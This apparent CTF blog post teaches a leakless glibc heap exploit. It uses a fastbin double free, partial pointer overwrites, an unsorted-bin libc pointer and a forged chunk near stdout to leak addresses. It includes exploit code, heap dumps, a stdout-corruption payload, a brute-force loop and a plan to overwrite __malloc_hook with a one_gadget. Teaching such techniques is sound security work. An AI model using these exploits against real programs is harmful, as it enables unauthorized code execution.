---
layout: post
title: Leakless Heap Feng Shui
tags: pwn, ctf, heap, fengshui, glibc
---

# Description:
This blog post will explain how to achieve a leak or full rce in leakless binaries, using Heap FengShui combined with other heap exploitation techniques.

# Assumptions:

*   The exploit will be developped in `glibc2.24` _(it can work in tcache as well)_.
*   We will have someway to control size of a chunk , off by one bug or double free can work.
*   We will be using a double free attack _(fastbin dup)_ .
*   The binary has only the option to malloc and free.
*   The binary has full protections.
*   Malloc size limit is `0x80`.
*   We can at maximum allocate `15` chunks in total.

# The exploit: 

At first we will try to get a chunk to unsortedbin , this way we will have main_arena pointers , we will use double  free for this.

Let's allocate 3 chunks the `0x41` values will be used later to free a fake chunk.
```python
malloc(0x40-8, 'B'*0x18 + p64(0x41))
malloc(0x70-8, 'C'*0x18 + p64(0x41)*3)
malloc(0x40-8, 'D'*0x28 + p64(0x41))
```

Now the heap layout looks like this:

```python
0x558e29d16000: 0x0000000000000000  0x0000000000000041  <-- chunk 0
0x558e29d16010: 0x4242424242424242  0x4242424242424242
0x558e29d16020: 0x4242424242424242  0x0000000000000041
0x558e29d16030: 0x0000000000000000  0x0000000000000000
0x558e29d16040: 0x0000000000000000  0x0000000000000071  <-- chunk 1
0x558e29d16050: 0x4343434343434343  0x4343434343434343
0x558e29d16060: 0x4343434343434343  0x0000000000000041
0x558e29d16070: 0x0000000000000041  0x0000000000000041  
0x558e29d16080: 0x0000000000000000  0x0000000000000000
0x558e29d16090: 0x0000000000000000  0x0000000000000000
0x558e29d160a0: 0x0000000000000000  0x0000000000000000
0x558e29d160b0: 0x0000000000000000  0x0000000000000041  <-- chunk 2
0x558e29d160c0: 0x4444444444444444  0x4444444444444444
0x558e29d160d0: 0x4444444444444444  0x4444444444444444
0x558e29d160e0: 0x4444444444444444  0x0000000000000041
0x558e29d160f0: 0x0000000000000000  0x0000000000020f11
```

Now we will do a fastbin dup attack on chunk0 and chunk2, we don't have to worry about top consolidation here because fastchunks.

```python
free(0)
free(1)
free(0)
```

Bins state :

```python
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x55cd34151000 --> 0x55cd341510b0 --> 0x55cd34151000 (overlap chunk with 0x55cd34151000(freed) )
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
                  top: 0x55cd341510f0 (size : 0x20f10) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x0
```

Now we will partially overwrite the fd of chunk0 and make it point to `0x558e29d16020` which will be a chunk with size `0x40`

```python
malloc(0x40-8, '\x20')
```

Bins state:

```python
(0x40)     fastbin[2]: 0x560e0ada50b0 --> 0x560e0ada5000 --> 0x560e0ada5020 (overlap chunk with 0x560e0ada5000(freed) )
```
Now we will empty our fastbins[2] and continue our fastbin attack and use the chunk `0x560e0ada5020` to modify the size of the chunk 1 to `0xb1`

```python
malloc(0x40-8, 'K')
malloc(0x40-8, 'Z')
malloc(0x40-8, 'A'*0x18 + '\xb1')
```

The heap status now :
```python
0x56271941b000: 0x0000000000000000  0x0000000000000041  <-- chunk 0,3,5
0x56271941b010: 0x000056271941b05a  0x4242424242424242  
0x56271941b020: 0x4242424242424242  0x0000000000000041  <-- chunk 6
0x56271941b030: 0x4141414141414141  0x4141414141414141
0x56271941b040: 0x4141414141414141  0x00000000000000b1  <-- chunk 1
0x56271941b050: 0x4343434343434343  0x4343434343434343  
0x56271941b060: 0x4343434343434343  0x0000000000000041
0x56271941b070: 0x0000000000000041  0x0000000000000041
0x56271941b080: 0x0000000000000000  0x0000000000000000
0x56271941b090: 0x0000000000000000  0x0000000000000000
0x56271941b0a0: 0x0000000000000000  0x0000000000000000
0x56271941b0b0: 0x0000000000000000  0x0000000000000041  <-- chunk 2,4
0x56271941b0c0: 0x000056271941b04b  0x4444444444444444  
0x56271941b0d0: 0x4444444444444444  0x4444444444444444
0x56271941b0e0: 0x4444444444444444  0x0000000000000041
0x56271941b0f0: 0x0000000000000000  0x0000000000020f11
```

All we need to do now is free chunk 1 it will go directly to unsorted bin, let's go back to our code and add another chunk before topchunk, to avoid consolidation since `0x40+0xb0 = 0xf0`

```python
free(1)
```

The heap will look like :
```python
0x556c3f05e000: 0x0000000000000000  0x0000000000000041
0x556c3f05e010: 0x0000556c3f05e05a  0x4242424242424242
0x556c3f05e020: 0x4242424242424242  0x0000000000000041
0x556c3f05e030: 0x4141414141414141  0x4141414141414141
0x556c3f05e040: 0x4141414141414141  0x00000000000000b1
0x556c3f05e050: 0x00007f94fa0e3b78  0x00007f94fa0e3b78
0x556c3f05e060: 0x4343434343434343  0x0000000000000041
0x556c3f05e070: 0x0000000000000041  0x0000000000000041
0x556c3f05e080: 0x0000000000000000  0x0000000000000000
0x556c3f05e090: 0x0000000000000000  0x0000000000000000
0x556c3f05e0a0: 0x0000000000000000  0x0000000000000000
0x556c3f05e0b0: 0x0000000000000000  0x0000000000000041
0x556c3f05e0c0: 0x0000556c3f05e04b  0x4444444444444444
0x556c3f05e0d0: 0x4444444444444444  0x4444444444444444
0x556c3f05e0e0: 0x4444444444444444  0x0000000000000041
0x556c3f05e0f0: 0x00000000000000b0  0x0000000000000070
0x556c3f05e100: 0x0000000000000045  0x0000000000000000
0x556c3f05e110: 0x0000000000000000  0x0000000000000000
0x556c3f05e120: 0x0000000000000000  0x0000000000000000
0x556c3f05e130: 0x0000000000000000  0x0000000000000000
0x556c3f05e140: 0x0000000000000000  0x0000000000000000
0x556c3f05e150: 0x0000000000000000  0x0000000000000000
0x556c3f05e160: 0x0000000000000000  0x0000000000020ea1
```

The next step is to have a fastbin chunk of size `0x70` with main_arena as fd, and we need to partially overwrite that fd as well.
Now we can do this using another fresh fastbindup attack with new chunks, but it will consume lot of mallocs.
let's dump the array of the chunks to have a  better look

```python
0x56077d825040: 0x000056077f21e010  0x000056077f21e050
0x56077d825050: 0x000056077f21e0c0  0x000056077f21e100
0x56077d825060: 0x000056077f21e010  0x000056077f21e0c0
0x56077d825070: 0x000056077f21e010  0x000056077f21e030
```

An important thing to notice is that chunk at index 7 is right before our unsorted chunk, what we can do is free it and realloc it, and change size now from `0xb1` to `0x71` 

the result :
```python
0x55a1a22d9000: 0x0000000000000000  0x0000000000000041
0x55a1a22d9010: 0x000055a1a22d905a  0x4242424242424242
0x55a1a22d9020: 0x4242424242424242  0x0000000000000041
0x55a1a22d9030: 0x0000000000000000  0x0000000000000000
0x55a1a22d9040: 0x0000000000000000  0x0000000000000071
0x55a1a22d9050: 0x00007fcdd6774b78  0x00007fcdd6774b78
0x55a1a22d9060: 0x4343434343434343  0x0000000000000041
0x55a1a22d9070: 0x0000000000000041  0x0000000000000041
0x55a1a22d9080: 0x0000000000000000  0x0000000000000000
0x55a1a22d9090: 0x0000000000000000  0x0000000000000000
0x55a1a22d90a0: 0x0000000000000000  0x0000000000000000
0x55a1a22d90b0: 0x0000000000000000  0x0000000000000041
0x55a1a22d90c0: 0x000055a1a22d904b  0x4444444444444444
0x55a1a22d90d0: 0x4444444444444444  0x4444444444444444
0x55a1a22d90e0: 0x4444444444444444  0x0000000000000041
0x55a1a22d90f0: 0x00000000000000b0  0x0000000000000070
0x55a1a22d9100: 0x0000000000000045  0x0000000000000000
0x55a1a22d9110: 0x0000000000000000  0x0000000000000000
0x55a1a22d9120: 0x0000000000000000  0x0000000000000000
0x55a1a22d9130: 0x0000000000000000  0x0000000000000000
0x55a1a22d9140: 0x0000000000000000  0x0000000000000000
0x55a1a22d9150: 0x0000000000000000  0x0000000000000000
0x55a1a22d9160: 0x0000000000000000  0x0000000000020ea1
```
well now if we free it the fd will be zeroed, a better idea is to free it before hands, maybe at the first fastbin attack

instead of 
```python
free(0)
free(2)
free(0)
```
we will use
```python
free(0)
free(2)
free(1)
```
Now the bins look like :
```python
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x5615c5002040 (overlap chunk with 0x5615c5002040(freed) )
(0x80)     fastbin[6]: 0x0
                  top: 0x5615c5002160 (size : 0x20ea0) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x5615c5002040 (size : 0x70)
```
and 
```python
0x558d9f577040: 0x0000000000000000  0x0000000000000071
0x558d9f577050: 0x00007fc1cadfbb78  0x00007fc1cadfbb78
0x558d9f577060: 0x4343434343434343  0x0000000000000041
0x558d9f577070: 0x0000000000000041  0x0000000000000041
```
we can again change our code and when we change the size to `0x71`, we partially overwrite the fd to point near `&stdout-0x43`
why ? :
when the binary calls `puts`, `puts` internally will call a function named `_IO_new_file_xsputn` which will call eventually `_IO_new_file_overflow`
```c
size_t  _IO_new_file_xsputn (FILE *f, const void *data, size_t n)
{
    const char *s = (const char *) data;
    size_t to_do = n;
    int must_flush = 0;
    size_t count = 0;
    ...
     if (to_do + must_flush > 0)
    {
      size_t block_size, do_write;
      /* Next flush the (full) buffer. */
      if (_IO_OVERFLOW (f, EOF) == EOF)
    /* If nothing else has to be written.  */
    ...
```


```c
int _IO_new_file_overflow (_IO_FILE *f, int ch)
{
  if (f->_flags & _IO_NO_WRITES) /* SET ERROR */
    {
      f->_flags |= _IO_ERR_SEEN;
      __set_errno (EBADF);
      return EOF;
    }
  /* If currently reading or no buffer allocated. */
  if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0 || f->_IO_write_base == NULL)
    {
      :
      :
    }
  if (ch == EOF)
    return _IO_do_write (f, f->_IO_write_base,  // our target
             f->_IO_write_ptr - f->_IO_write_base);
``` 

`_IO_do_write ` is called the end after some checks, we just need to set `f->_flags=_IO_NO_WRITES=0` and `f->_flags & _IO_CURRENTLY_PUTTING) == 0`

`_IO_do_write`  will call `new_do_write`

```c
static
_IO_size_t
new_do_write (_IO_FILE *fp, const char *data, _IO_size_t to_do)
{
  _IO_size_t count;
  if (fp->_flags & _IO_IS_APPENDING)
    /* On a system without a proper O_APPEND implementation,
       you would need to sys_seek(0, SEEK_END) here, but is
       not needed nor desirable for Unix- or Posix-like systems.
       Instead, just indicate that offset (before and after) is
       unpredictable. */
    fp->_offset = _IO_pos_BAD;
  else if (fp->_IO_read_end != fp->_IO_write_base)
    {
      _IO_off64_t new_pos
    = _IO_SYSSEEK (fp, fp->_IO_write_base - fp->_IO_read_end, 1);
      if (new_pos == _IO_pos_BAD)
    return 0;
      fp->_offset = new_pos;
    }
  count = _IO_SYSWRITE (fp, data, to_do);
```

and `_IO_SYSWRITE` is basically `write`

```c
#define _IO_SYSWRITE(FP, DATA, LEN) JUMP2 (__write, FP, DATA, LEN)
```

`_IO_SYSWRITE` is called with `fp->_IO_write_base` as arg, so we can partially overwrite  the last byte there, and get some leaks
we also need to set `fp->_IO_IS_APPENDING`

```python
malloc(0x70-8, 'D'*27 + p64(0x0)*3 + p64(0xfbad1800) + p64(0x0)*3 + "\x08")
```


Finally we will use the address at `&stdout-0x71` , because it is the only viable place with a valid size (`0x7f`) before `&stdout`:

```python
0x7fc1cadfc5dd <_IO_2_1_stderr_+157>:   0xc1cadfb660000000  0x000000000000007f
0x7fc1cadfc5ed <_IO_2_1_stderr_+173>:   0x0000000000000000  0x0000000000000000
0x7fc1cadfc5fd <_IO_2_1_stderr_+189>:   0x0000000000000000  0x0000000000000000
0x7fc1cadfc60d <_IO_2_1_stderr_+205>:   0x0000000000000000  0xc1cadfa6e0000000
0x7fc1cadfc61d <_IO_2_1_stderr_+221>:   0x00fbad288700007f  0xc1cadfc6a3000000
0x7fc1cadfc62d <_IO_2_1_stdout_+13>:    0xc1cadfc6a300007f  0xc1cadfc6a300007f
```
when we hit the jackpot after 4 bits bruteforce, we will be in control over stdout
we will run our exploit in a while loop with a try catch block :

```python
malloc(0x70-8, 'D'*27 + p64(0x0)*3 + p64(0xfbad1800) + p64(0x0)*3 + "\x08")
try :
    leak = p.recv()
    print leak
    p.interactive()
except :
    pass
```
```
while :; do  python exploit.py; done```

and eventually we will hit the jackpot and get a leak, after this we we still have 5 possible allocations, which is more than enough for a second fastbin dup on `__malloc_hook` and overwrite it  with `one_gadget`.